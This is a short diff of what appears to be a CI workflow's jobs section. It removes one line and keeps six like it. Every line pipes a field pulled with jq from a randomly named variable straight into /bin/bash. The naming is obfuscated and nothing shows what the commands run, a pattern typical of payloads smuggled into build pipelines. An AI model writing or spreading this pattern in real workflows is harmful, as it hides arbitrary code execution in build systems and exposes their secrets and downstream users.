@@ -26,7 +26,6 @@ jobs:
           echo $z45393 | jq -r .hmlv2 | /bin/bash
           printf '%s' "$u38" | jq -r .kpimq5055 | /bin/bash
           echo $j78 | jq -r .hpo5622 | /bin/bash
-          echo $va705 | jq -r .vm96309 | /bin/bash
           printf '%s' "$bc04115" | jq -r .eo36 | /bin/bash
           echo $lgmw4 | jq -r .h388 | /bin/bash
           echo $rd22 | jq -r .jmi41294 | /bin/bash
